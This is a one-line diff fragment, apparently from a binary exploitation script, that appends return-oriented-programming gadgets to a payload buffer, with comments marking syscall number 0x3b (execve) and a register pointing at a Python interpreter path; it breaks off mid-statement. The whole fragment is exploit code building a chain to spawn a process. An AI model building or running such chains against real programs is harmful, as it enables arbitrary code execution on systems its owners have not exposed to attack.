@@ -1,0 +1,1 @@
+buf += shr_eax # 00111011 = 59 = 0x3b ## rdi --> pointer to "/usr/local/bin/python2" buf += pop_rdx buf += p64
